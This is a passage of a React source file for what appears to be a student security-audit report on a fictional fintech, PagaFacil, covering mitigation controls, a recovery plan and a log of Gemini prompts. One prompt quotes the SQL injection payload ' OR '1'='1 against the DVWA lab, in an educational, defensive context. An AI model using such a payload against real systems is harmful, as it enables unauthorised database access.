const Controles = () => (
  <div className="space-y-6">
    <div className="border-b pb-4 custom-border">
      <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/07_controles_lopeli.md</span>
      <h1 className="text-3xl font-extrabold custom-text mt-1">Prevención y Mitigación</h1>
    </div>
    <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
      <div className="p-6 border custom-border rounded-xl bg-black/5 dark:bg-white/5 transition-all duration-300 hover:-translate-y-1 hover:shadow-md">
        <h4 className="font-bold text-[#8661C1] dark:text-[#98d9f7] mb-3 uppercase text-xs tracking-widest border-b border-[#98d9f7]/30 pb-1.5">Controles Técnicos</h4>
        <ul className="text-xs list-disc pl-4 space-y-2 custom-text-muted leading-relaxed">
          <li>WAF con firmas específicas de inyección SQL y Command Injection.</li>
          <li>Hashing criptográfico con Argon2id para credenciales críticas.</li>
          <li>Tokenización segura para el resguardo de información de tarjetas bancarias.</li>
        </ul>
      </div>
      <div className="p-6 border custom-border rounded-xl bg-black/5 dark:bg-white/5 transition-all duration-300 hover:-translate-y-1 hover:shadow-md">
        <h4 className="font-bold text-[#8661C1] dark:text-[#98d9f7] mb-3 uppercase text-xs tracking-widest border-b border-[#98d9f7]/30 pb-1.5">Políticas Organizacionales</h4>
        <ul className="text-xs list-disc pl-4 space-y-2 custom-text-muted leading-relaxed">
          <li>Auditorías periódicas de logs transaccionales e infraestructura.</li>
          <li>MFA obligatorio para todos los colaboradores de PagaFacil.</li>
          <li>Restricción de accesos basado en roles de menor privilegio.</li>
        </ul>
      </div>
    </div>
  </div>
);

// 08_RECUPERACION_LOPELI.MD
const Recuperacion = () => (
  <div className="space-y-6">
    <div className="border-b pb-4 custom-border">
      <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/08_recuperacion_lopeli.md</span>
      <h1 className="text-3xl font-extrabold custom-text mt-1">Recuperación (DRP)</h1>
    </div>
    <div className="p-6 bg-[#2E294E] text-[#98d9f7] font-mono text-xs rounded-xl border border-[#98d9f7] shadow-xl relative overflow-hidden group">
      <div className="absolute top-0 right-0 w-24 h-24 bg-[#8661C1]/20 rounded-full blur-2xl group-hover:scale-150 transition-transform duration-500"></div>
      <div className="mb-4 text-white border-b border-[#98d9f7]/50 pb-2 font-bold tracking-widest text-center">PLAN DE CONTINUIDAD ACTIVO</div>
      <p className="mb-2.5">1. REPLICACIÓN DE BASE DE DATOS: Respaldo en la nube sincronizado.</p>
      <p className="mb-2.5">2. RTO (Recovery Time Objective): Máximo 2 Horas.</p>
      <p className="mb-2.5">3. RPO (Recovery Point Objective): Máximo 15 Minutos.</p>
      <p>4. INFRAESTRUCTURA DE RESPALDO: Despliegue automatizado Multi-AZ.</p>
    </div>
  </div>
);

// 09_PROMPTS_LOPELI.MD
const Prompts = () => (
  <div className="space-y-6">
    <div className="border-b pb-4 custom-border">
      <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/09_prompts_lopeli.md</span>
      <h1 className="text-3xl font-extrabold custom-text mt-1">Bitácora de Uso de IA</h1>
    </div>
    <div className="space-y-4 custom-text">
      <div className="p-5 bg-[#CAA8F5]/15 dark:bg-white/5 rounded-xl border-l-4 border-[#592E83] text-sm transition-all duration-300 hover:scale-[1.01]">
        <p className="font-bold mb-2">Prompt 1 - Resumen y arquitectura</p>
        <p className="custom-text-muted text-xs leading-relaxed">
          Herramienta: Gemini. Prompt: “Redacta un resumen ejecutivo para una auditoría web de una fintech ficticia llamada PagaFacil, destacando portal de clientes, activos críticos y contexto de negocio.”
        </p>
      </div>

      <div className="p-5 bg-[#CAA8F5]/15 dark:bg-white/5 rounded-xl border-l-4 border-[#5BE4F7] text-sm transition-all duration-300 hover:scale-[1.01]">
        <p className="font-bold mb-2">Prompt 2 - SQL Injection</p>
        <p className="custom-text-muted text-xs leading-relaxed">
          Herramienta: Gemini. Prompt: “Explica por qué funciona una SQLi con payload ' OR '1'='1 en DVWA, incluye CVSS 3.1 y defensas como consultas parametrizadas.”
        </p>
      </div>

      <div className="p-5 bg-[#CAA8F5]/15 dark:bg-white/5 rounded-xl border-l-4 border-[#9984D4] text-sm transition-all duration-300 hover:scale-[1.01]">
        <p className="font-bold mb-2">Prompt 3 - XSS y comandos</p>
        <p className="custom-text-muted text-xs leading-relaxed">
          Herramienta: Gemini. Prompt: “Describe XSS reflejado y command injection en una aplicación web vulnerable, con recomendaciones de prevención y mitigación.”
        </p>
      </div>

      <div className="p-5 bg-[#CAA8F5]/15 dark:bg-white/5 rounded-xl border-l-4 border-[#230C33] text-sm transition-all duration-300 hover:scale-[1.01]">
        <p className="font-bold mb-2">Prompt 4 - Base React para App.jsx</p>
        <p className="custom-text-muted text-xs leading-relaxed">
          Herramienta: Gemini. Prompt: “Crea la base de una aplicación React con Vite para una auditoría de seguridad web, con navegación lateral, secciones por archivo Markdown y un componente visual para la matriz de riesgo.”
        </p>
      </div>

      <p className="text-xs custom-text-muted leading-relaxed">
        La IA se usó como apoyo para redactar, estructurar y acelerar el armado del informe, pero cada respuesta fue verificada y adaptada al contexto de PagaFacil y a la pauta de evaluación.
      </p>
    </div>
  </div>
);


export default function App() {
  const [activeTab, setActiveTab] = useState('resumen');
  const [darkMode, setDarkMode] = useState(true);
  const [menuOpen, setMenuOpen] = useState(false);

  // Inyección dinámica de estilos css
  useEffect(() => {
    const styleId = "custom-theme-colors";
    let styleElement = document.getElementById(styleId);
    if (!styleElement) {
      styleElement = document.createElement("style");
      styleElement.id = styleId;
      document.head.appendChild(styleElement);
    }
    styleElement.innerHTML = themeStyles;
  }, []);

  const menuItems = [
    { id: 'resumen', label: 'Resumen Ejecutivo', component: <Resumen />, icon: <ShieldIcon /> },
    { id: 'sqli', label: 'Inyección SQL (SQLi)', component: <SQLi />, icon: <DatabaseIcon /> },
    { id: 'xss', label: 'Cross-Site Scripting (XSS)', component: <XSS />, icon: <CodeIcon /> },
    { id: 'comandos', label: 'Inyección de Comandos', component: <Comandos />, icon: <TerminalIcon /> },
    { id: 'activos', label: 'Activos de Información', component: <Activos />, icon: <FolderIcon /> },
    { id: 'matriz', label: 'Matriz de Riesgo', component: <Matriz />, icon: <GridIcon /> },
    { id: 'controles', label: 'Controles de Mitigación', component: <Controles />, icon: <SettingsIcon /> },
    { id: 'recuperacion', label: 'Plan de Recuperación', component: <Recuperacion />, icon: <RefreshIcon /> },
    { id: 'prompts', label: 'Bitácora IA', component: <Prompts />, icon: <SparklesIcon /> },
  ];

  const ActiveComponent = menuItems.find(item => item.id === activeTab)?.component;
  const sidebarClassName = `
    ${menuOpen ? 'translate-x-0' : '-translate-x-full'} 
    md:translate-x-0 fixed md:relative z-50 w-72 h-full p-6 border-r transition-transform duration-300 flex flex-col justify-between
    ${darkMode ? 'bg-[#2E294E] border-[#4B5267]' : 'bg-[#F7F5FA] border-[#BE97C6]'}`;

  const sidebarTitleClassName = darkMode
    ? 'text-lg font-black tracking-tight custom-text transition-all duration-300 group-hover:text-[#5BE4F7]'
    : 'text-lg font-black tracking-tight custom-text transition-all duration-300 group-hover:text-[#592E83]';

  const sidebarLinkClassName = darkMode
    ? 'flex items-center gap-2 text-xs font-bold custom-text-muted hover:text-[#5BE4F7] transition-colors'
    : 'flex items-center gap-2 text-xs font-bold custom-text-muted hover:text-[#592E83] transition-colors';

  return (
    <div className={`${darkMode ? 'dark' : ''} min-h-screen custom-bg transition-colors duration-500`}>
      <div className="flex flex-col md:flex-row min-h-screen">
        
        {/* NAVEGACIÓN LATERAL / SIDEBAR */}
        <aside className={sidebarClassName}>
          <div>
            <div className="flex items-center mb-8 gap-2 group cursor-pointer">
              <div className="w-9 h-9 bg-[#8661C1] rounded-xl flex items-center justify-center font-black text-white shadow-md transform transition-transform duration-300 group-hover:rotate-12">
                PF
              </div>
              <h2 className={sidebarTitleClassName}>Auditoría LOPELI</h2>
            </div>

            <nav className="space-y-2">
              {menuItems.map(item => (
                <button
                  key={item.id}
                  onClick={() => { setActiveTab(item.id); setMenuOpen(false); }}
                  className={`w-full flex items-center p-3 rounded-xl text-xs font-bold transition-all duration-300 transform active:scale-95 cursor-pointer ${
                    activeTab === item.id 
                      ? 'bg-[#592E83] text-[#CAA8F5] shadow-lg shadow-[#592E83]/35 translate-x-1.5' 
                      : darkMode
                        ? 'custom-text-muted hover:bg-white/10 hover:translate-x-1'
                        : 'custom-text-muted hover:bg-[#5BE4F7]/20 hover:text-[#592E83] hover:translate-x-1'
                  }`}
                >
                  <span className="opacity-85">{item.icon}</span>
                  <span className="truncate">{item.label}</span>
                </button>
              ))}
            </nav>
          </div>

          <div className="pt-6 border-t border-[#98d9f7]/20">
            <a 
              href="https://github.com/Alejandralx22" 
              target="_blank" 
              rel="noreferrer" 
              className={sidebarLinkClassName}
            >
              <CodeIcon />
              <span>github</span>
            </a>
          </div>
        </aside>

        {/* MÓVIL OVERLAY */}
        {menuOpen && <div className="fixed inset-0 bg-black/60 z-40 md:hidden backdrop-blur-sm" onClick={() => setMenuOpen(false)}></div>}

        {/* CONTENEDOR DE CONTENIDO PRINCIPAL */}
        <main className="flex-1 flex flex-col overflow-hidden min-h-screen">
          
          {/* CABECERA */}
          <header className="h-16 border-b custom-border flex items-center justify-between px-6 bg-white/80 dark:bg-[#2E294E]/80 backdrop-blur-md sticky top-0 z-30 transition-colors duration-300">
            <button onClick={() => setMenuOpen(true)} className="md:hidden p-2 bg-[#98d9f7]/20 dark:bg-white/5 rounded-lg custom-text hover:scale-105 active:scale-95 transition-all">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
            </button>
            
            <div className="hidden md:block text-xs font-bold custom-text-muted">
              <span>Fintech: </span><span className="custom-text">PagaFacil</span> | <span>Auditor: </span><span className="custom-text">LOPELI</span>
            </div>

            <button 
              onClick={() => setDarkMode(!darkMode)}
              className="p-2.5 bg-[#5BE4F7]/20 dark:bg-white/5 rounded-full transition-all duration-500 hover:scale-110 hover:rotate-12 cursor-pointer"
            >
              {darkMode ? '☀️' : '🌙'}
            </button>
          </header>

          {/* CUERPO DEL INFORME */}
          <section className="flex-1 overflow-y-auto p-4 sm:p-6 lg:p-8">
            <div className="max-w-4xl mx-auto custom-card p-6 sm:p-10 rounded-2xl shadow-xl border custom-border animate-in fade-in slide-in-from-bottom-3 duration-300">
              {ActiveComponent}
            </div>
          </section>

          {/* PIE DE PÁGINA */}
          <footer className="p-4 text-[10px] text-center custom-text-muted border-t custom-border opacity-70">
            © 2026 Auditoría de Seguridad PagaFacil - Sistema LOPELI
          </footer>
        </main>
      </div>
    </div>
  );
}